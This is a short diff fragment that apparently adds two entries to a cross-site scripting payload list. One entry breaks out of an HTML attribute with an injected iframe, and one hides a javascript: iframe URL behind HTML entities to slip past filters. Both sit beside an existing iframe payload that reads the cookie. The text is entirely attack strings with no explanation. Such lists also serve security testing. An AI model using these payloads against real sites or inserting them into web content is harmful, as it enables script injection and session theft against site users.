@@ -10,6 +10,8 @@
 
 
 <IFRAME SRC="javascript:alert('Window.document.cookie');"></IFRAME>
+"><h1><IFRAME SRC="javascript:alert('xss');"></IFRAME>">11</h1>
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 
 
 
